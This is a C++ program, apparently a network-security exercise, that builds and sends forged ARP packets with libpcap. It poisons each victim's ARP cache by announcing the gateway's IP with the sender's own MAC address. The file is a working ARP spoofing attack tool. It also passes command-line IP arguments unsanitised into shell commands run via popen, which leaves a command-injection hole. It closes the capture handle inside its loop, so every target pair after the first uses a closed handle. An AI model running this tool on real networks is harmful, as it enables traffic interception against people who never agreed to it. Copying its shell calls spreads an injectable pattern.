#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cstdio>
#include <cstring>
#include <stdio.h>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


string cmd(string command) {
    std::string result;
    char buffer[128];

    FILE* pipe = popen(command.c_str(), "r");

    if (!pipe) {
        return "Error: popen failed!";
    }

    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }

    pclose(pipe);

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

string getMymac(string inter) {
    string command = "ifconfig " + inter;
    string output = cmd(command);
    istringstream iss(output);

    string line;

    while (getline(iss, line)) {
        auto pos = line.find("ether ");
        if (pos != std::string::npos) {
            std::string macAddress = line.substr(pos + 6, 17);
            return macAddress;
        }

    }
    return "";
}

string getVmac(string vip) {
    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $3}' ";
    string output = cmd(command);
    return output;
}



int main(int argc, char* argv[]) {
    if (argc < 4) {
        cout << "put all interface & address"<<endl;
	return 0;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];   
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    string mymac = getMymac(argv[1]);


    for (int i = 2; i < argc; i=i+2) {
        EthArpPacket packet;

	string arpUp = "sudo arping -c 5 " + (string)argv[i];
        cmd(arpUp);

        string vmac = getVmac(argv[i]); //victim mac

        packet.eth_.dmac_ = Mac(vmac);
        packet.eth_.smac_ = Mac(mymac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(mymac);
        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //gateway ip
        packet.arp_.tmac_ = Mac(vmac);
        packet.arp_.tip_ = htonl(Ip(argv[i])); //victim ip

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        pcap_close(handle);
    }

}

